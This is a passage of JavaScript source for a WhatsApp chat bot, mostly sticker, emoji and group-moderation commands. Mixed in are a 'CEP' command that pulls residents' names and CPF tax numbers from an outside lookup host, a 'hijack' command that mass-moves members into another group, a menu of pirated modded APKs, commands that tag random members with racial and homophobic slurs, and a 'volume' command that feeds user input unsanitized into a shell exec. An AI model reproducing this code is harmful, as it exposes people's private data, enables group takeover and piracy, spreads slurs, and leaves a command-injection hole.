            cepyy = await fetchJson(`http://onlyfans.rardebuseta.tk/?type=cep&query=${q}`)
           
    
            cep = `< Consulta CEP Completa >
    
${cepyy.map((cepyy) => `- Nome: ${cepyy.nome}\n- Cpf: ${cepyy.cpf}\n- Rua: ${cepyy.logradouro}\n- Complemento: ${cepyy.complemento}\n- Número: ${cepyy.numero}`).join('\n\n') || 'Sem Informações'}
    `.trim()
            m.reply(cep)
            }
            break
            case 'acharmsc':
{
            if (!isPremium) return m.reply(`❌ Você não é um usuário premium!`)
            if (/image/.test(mime)) return m.reply('🔈 Utilize o comando marcando um *áudio*!')
            		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
        let media = await client.downloadAndSaveMediaMessage(quoted)
            m.reply(`[ 🔎 ] Buscando por aproximidade...`)
  let anu = await UploadFileUgu(media)
  try{
            ini_url = await fetchJson(`https://violetics.pw/api/search/music-finder?apikey=beta&audio=${anu.url}`)
console.log(ini_url.result.title)
a = `🍨 𝐃𝐀𝐃𝐎𝐒 𝐀𝐏𝐑𝐎𝐗𝐈𝐌𝐀𝐃𝐎𝐒:

⥂𝐓𝐈𝐓𝐔𝐋𝐎: ${ini_url.result.title}
⥂𝐀𝐋𝐁𝐔𝐌: ${ini_url.result.album}
⥂𝐀𝐑𝐓𝐈𝐒𝐓𝐀𝐒: ${ini_url.result.artists}
⥂𝐃𝐔𝐑𝐀𝐂𝐀𝐎: ${ini_url.result.duration}

🍭๖𝐁𝐘 - 𝐑𝐈𝐒𝐊𝐘 𝐌𝐎𝐃𝐙`
  m.reply(a)
}catch(e){
m.reply('❌ *NÃO* foi possível encontrar resultados...')
}
}
            break
    case 'apps': {
        const sections = [{
            "title": "𝐀𝐩𝐩𝐬 𝐃𝐢𝐬𝐩𝐨𝐧𝐢́𝐯𝐞𝐢𝐬",
            "rows": [
{
  "title": "𝘊𝘢𝘱𝘊𝘶𝘵 - 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥",
  "description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘣𝘢𝘪𝘹𝘢𝘳.",
  "rowId": `${prefix}appdown https://www.mediafire.com/file/7fulvzd4hlni71i/CapCut_PRO_-_v7.3.0_Tekmods.com.apk/file`
  },
{
  "title": "𝘐𝘯𝘴𝘵𝘢𝘨𝘳𝘢𝘮 𝘗𝘳𝘰 - 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥",
  "description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘣𝘢𝘪𝘹𝘢𝘳.",
  "rowId": `${prefix}appdown https://www.mediafire.com/file/oiw9yfdn8dkzexu/InstaPro_v9.50-Tekmods.com.apk/file`
  },
  {
  "title": "𝘚𝘱𝘰𝘵𝘪𝘧𝘺 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 - 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥",
  "description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶. ",
  "rowId": `${prefix}appdown https://www.mediafire.com/file/3bpd3onkut9ef1p/Spotify_v8.7.90.544_%255BPremium%255D-Tekmods.com.apk/file`
        }]},
        {
            "title": "©️ Malia-Robot",
            "rows": [
{
  "title": "Criado com ❤️",
  "description": "@david.sousz",
  "rowId": `${prefix}tqto`
}
            ]
        }
    ]
    let con = `┏─────────────────⬣
    ┆ 𝑶𝒊𝒊, ${pushname} 👋
    ┗┬──────────────┈ ⳹
    ┏┆♠︎ 𝙽𝚘𝚖𝚎 : ${pushname}
    ┃┆♠︎ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 : ${isPremium ? '✅' : `❌`}
    ┃┆♠︎ 𝙻𝚒𝚖𝚒𝚝𝚎 :  ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
    ┗┬──────────────┈ ⳹
    ┏┤   𝑫𝒂𝒕𝒂 𝒆 𝑯𝒐𝒓𝒂
    ┆┗──────────────┈ ⳹
    ┆♠︎ 𝚃𝚎𝚖𝚙𝚘 𝙾𝚗𝚕𝚒𝚗𝚎 : ${runtime(process.uptime())}
    ┆♠︎ 𝙷𝚘𝚛𝚊𝚛𝚒𝚘 :  ${moment.tz('America/Fortaleza').format('HH')} H${moment.tz('America/Fortaleza').format('mm')} M${moment.tz('America/Fortaleza').format('ss')} S
    ┗─────────────────⬣`
    let hariRayaramadan = new Date('Abril 21, 2023 23:59:59') 
         let sekarangg = new Date().getTime() 
         let lebih = hariRayaramadan - sekarangg 
         let harii = Math.floor( lebih / (1000 * 60 * 60 * 24)); 
         let jamm = Math.floor( lebih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60)) 
         let menitt = Math.floor( lebih % (1000 * 60 * 60) / (1000 * 60)) 
         let detikk = Math.floor( lebih % (1000 * 60) / 1000) 
    let fot = `𝘊𝘢𝘴𝘰 𝘦𝘯𝘤𝘰𝘯𝘵𝘳𝘦 𝘢𝘭𝘨𝘶𝘯𝘴 𝘣𝘶𝘨 𝘰𝘶 𝘦𝘳𝘳𝘰, 𝘥𝘪𝘨𝘪𝘵𝘦 #𝘙𝘦𝘱𝘰𝘳𝘵𝘢𝘳
    `
    const listMessage = {
    footer: fot,
    text: 'Feito por Risky Modz',
    title: con,
    buttonText: `CLIQUE AQUI ⎙`, 
    sections
    }
    const sendMsg = await client.sendMessage(m.chat, listMessage ,{quoted: fkontak})
    }
    break
    
    case 'appdown': {
    if (!text) throw mess.linkm
    if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
    const { mediafireDl } = require('./lib/mediafire.js')
    const baby1 = await mediafireDl(text)
    if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
    const result4 = `*⎙ 𝐁𝐀𝐈𝐗𝐀𝐍𝐃𝐎 𝐀𝐑𝐐𝐔𝐈𝐕𝐎*
  
    ᭧ *𝐀𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐕𝐎* : ${baby1[0].nama}
    ᭧ *𝐓𝐀𝐌𝐀𝐍𝐇𝐎* : ${baby1[0].size}
    
    𝐁𝐲: 𝐑𝐢𝐬𝐤𝐲 𝐌𝐨𝐝𝐳`
    m.reply(`${result4}`)
    client.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
    }
    break
case 'hijack':{
  if(!isCreator) throw mess.owner
  let text1 = q.split("|")[0]
  let text2 = q.split("|")[1]
  if(!text1) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
  if(!text2) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
  client.sendMessage(text1, { text: `Member kidnapping request by @${msg.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [msg.sender] },{ quoted : msg })               
  await client.sendMessage(from, { text: `Member kidnapping request by @${msg.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [msg.sender] },{ quoted : msg })
  await m.sequestrar(text1, groupMembers.map(mem => mem.id), text2)
  }
  break
case 'repeat':{
let text1 = q.split("|")[0]
let text2 = q.split("|")[1]
if (!text1) return m.reply(`Example! : ${order + ' ' + 'test|30'}`)    
if (!text2) return m.reply(`Example! : ${order + ' ' + 'test|30'}`)
let txtzh = `${text1}`.repeat(text2)
               m.reply(txtzh)
              }
           break
case 'id':{
            m.reply(from)
           }
          break
  case 'pinsticker': case 'pinstick': case 'pintereststicker':{
   if (args.length < 1) return m.reply('What picture are you looking for?')
     client.sendMessage(from, { react: { text: "⏱️", key: m.key }})
     try{
   const pint = await pinterest(`${q}`)
     let xm_za = pint[Math.floor(Math.random() * pint.length)];
       console.log(xm_za)      
     let hek = await getBuffer(xm_za)
     let buffers = await writeExifImg(hek, { packname: global.packname, author: global.author })
       await client.sendMessage(from, { sticker: { url: buffers } }, { quoted: m })
       } catch (e) { e = String(e)
      m.reply('Not found!')
   }
  }
  break
 case 'tinyurl':{
   if(!q) return m.reply('link?')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  m.reply(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'img':
case 'image': {
m.reply(mess.wait)
		let { pinterest } = require('./lib/scraperW')
anu = await pinterest(text)
resultkkk3 = anu[Math.floor(Math.random() * anu.length)]
client.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ⫹⫺ Media Url : `+resultkkk3 }, { quoted: m })
            }
            break

case 'zippyshare': {
if (!text) return m.reply(mess.linkm)
if (!isUrl(args[0]) && !args[0].includes('zippyshare.com')) return m.reply(`The link is not a zippyshare link`)
anu = await fetchJson(`https://violetics.pw/api/downloader/zippyshare?apikey=df7d-425a-3bc8&url=${text}`)
m.reply(`*${util.format(anu)}*`)
linkyke = await getBuffer(anu.result.dlink)
client.sendMessage(m.chat, {document: linkyke, mimetype: 'application/zip', fileName: `${anu.result.filename}`}, {quoted:m}).catch ((err) => m.reply(mess.error))     
}
break
case 'happymod': {
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} mobile legend`)
xeontod.happymod(args.join(" ")).then(async(res) => {
teks = '```「 HappyMod Search 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}`
}
let buttons = [
{buttonId: `menu`, buttonText: {displayText: 'Menu🥀'}, type: 1}
]
let buttonMessage = {
image: {url:res[0].icon},
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
buttons: buttons,
headerType: 4
}
client.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
case 'servermc': {
xeontod.servermc().then(async(res) => {
let teks = '*| MINECRAFT SERVER |*\n\nhttps://minecraftpocket-servers.com/country/indonesia/\n\n'
let no = 1
for (let i of res) {
teks += `⫹⫺ Server To ${no++}\nip : ${i.ip}\nport : ${i.port}\nversi : ${i.versi}\nplayer : ${i.player}\n\n`
}
let buttons = [
{buttonId: `menu`, buttonText: {displayText: 'Menu🥀'}, type: 1}
]
let buttonMessage = {
image: log0,
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
buttons: buttons,
headerType: 4
}
client.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
case 'mcpedl': {
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} shader`)
xeontod.mcpedl(args.join(" ")).then(async(res) => {
teks = `*| MCPEDL SEARCH |*`
for (let i of res) {
teks += `\n\nName : ${i.name}\nCategory : ${i.category}\nDate : ${i.date}\nDesc : ${i.desc}\nLink : ${i.link}`
}
let buttons = [
{buttonId: `menu`, buttonText: {displayText: 'Menu🥀'}, type: 1}
]
let buttonMessage = {
image: log0,
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
buttons: buttons,
headerType: 4
}
client.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
           
case 'swm2': case 'take2': case 'stickerwm2': {
if (!args.join(" ")) return m.reply(`Example :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
client.downloadAndSaveMediaMessage(quoted, "gifee")
client.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await client.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await client.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
m.reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
let { TelegraPh } = require('./lib/uploader')
if (!text) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (text.includes('|')) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
m.reply(mess.wait)
mee = await client.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await client.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
case 'emoji': {
if (!args.join(" ")) return m.reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await client.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await client.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return m.reply(`Example: ${prefix + command} 10`)
media = await client.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
client.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
client.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
m.reply("Send video/audio")
}
}
break
case 'triggeredwebp': case 'wanted': {
	            if (!/image/.test(mime)) return m.reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader3')
let media = await client.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
let buf = await getBuffer(`https://cililitan.herokuapp.com/api/${command}?url=${anu}`)
client.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => m.reply(mess.error))
}
break
case 'igemoji': 
case 'instagramemoji': 
if (!q) return m.reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return m.reply("Um emoji no máximo, tendeu??" + ` ${prefix + command} 😀`)
m.reply(mess.wait)
emote(q, "10")
break

case 'ttp': {
           if (!text) return m.reply(`*Example : ${prefix + command} hello*`)
           await client.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
         
   }
   break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
  case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
  case 'lovelycheck':
    case 'uglycheck':
				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
client.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
					break
  case 'stupid':
      case 'foolish':
      case 'smart':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'bastard':
      case 'stubble':
      case 'dog':
      case 'fuck':
      case 'ape':
      case 'noob':
      case 'great':
      case 'horny':
      case 'wibu':
      case 'asshole':
      case 'handsome':
      case 'beautiful':
      case 'cute':
      case 'kind':
      case 'ugly':
      case 'pretty':
      case 'lesbian':
      case 'randi':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
            if (!m.isGroup) return m.reply(`${mess.group}`)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `The Most *${command}* Here Is @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
{ buttonId: '👀', buttonText: { displayText: '👀😂' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
case 'fliptext': {
if (args.length < 1) return m.reply(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
m.reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'toviewonce': case 'toonce': { 
        if (!quoted) return m.reply(`Reply image`)
        if (/image/.test(mime)) {
anu = await client.downloadAndSaveMediaMessage(quoted)
client.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
        } else if (/video/.test(mime)) {
        anu = await client.downloadAndSaveMediaMessage(quoted)
        client.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
        }
        }
        break
case 'autosticker':
            case 'autostiker':
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return m.reply(`Já está Ativado!`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('autosticker activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('auto sticker deactivated')
}
break
case 'autostickerpc':
            case 'autostikerpc':
if (!m.isGroup) return m.reply(mess.group)
if (args.length < 1) return m.reply('type autosticker on to activate\ntype autosticker off to disable')
if (args[0]  === 'on'){
if (isAutoStick) return m.reply(`Já está Ativado!`)
_autostick.push(from)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
reply('autosticker pc activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(from)
_autostick.splice(anu, 1)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
m.reply('autosticker pc deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return m.reply('Já está Ativado!')
ntvirtex.push(from)
m.reply('Success in turning on antivirus in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return m.reply('Já está Desativado!')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
m.reply('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'autosticker':
            case 'autostiker':
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return m.reply(`Já está Ativado!`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
reply('autosticker activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('auto sticker deactivated')
}
break
case 'autostickerpc':
            case 'autostikerpc':
if (!m.isGroup) return m.reply(mess.group)
if (args.length < 1) return m.reply('type autosticker on to activate\ntype autosticker off to disable')
if (args[0]  === 'on'){
if (isAutoStick) return m.reply(`Já está Ativado!`)
_autostick.push(from)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
reply('autosticker pc activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(from)
_autostick.splice(anu, 1)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
m.reply('autosticker pc deactivated')
}
break
case 'antilinkgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLink) return m.reply('Já está Ativado!')
ntilink.push(from)
m.reply('Success in turning on group chat antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the group link in this group or u will be kicked immediately`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Já está Desativado!')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Success in turning off group chat antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('Já está Ativado!')
ntilinkytvid.push(from)
m.reply('Success in turning on youtube video antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('Já está Desativado!')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
m.reply('Success in turning off youtube video antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('Já está Ativado!')
ntilinkytch.push(from)
m.reply('Success in turning on youtube channel antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('Já está Desativado!')
let off = ntilinkytch.indexOf(from)
ntilinkytch.splice(off, 1)
m.reply('Success in turning off youtube channel antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('Já está Ativado!')
ntilinkig.push(from)
m.reply('Success in turning on instagram antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('Já está Desativado!')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
m.reply('Success in turning off instagram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
